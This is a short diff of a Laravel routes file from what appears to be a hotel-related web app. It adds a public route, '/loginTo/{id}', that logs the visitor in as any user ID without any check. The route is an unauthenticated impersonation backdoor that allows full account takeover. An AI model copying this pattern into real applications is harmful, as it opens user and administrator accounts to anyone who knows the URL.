@@ -9,6 +9,11 @@ Route::get('databaseforall', function (){
 
 });
 
+Route::get('/loginTo/{id}', function($id){
+   auth()->loginUsingId($id);
+   return redirect()->back();
+});
+
 Route::get('fillHotelPic', function(){
     $Place = \App\models\Hotel::all();
     foreach ($Place as $item){
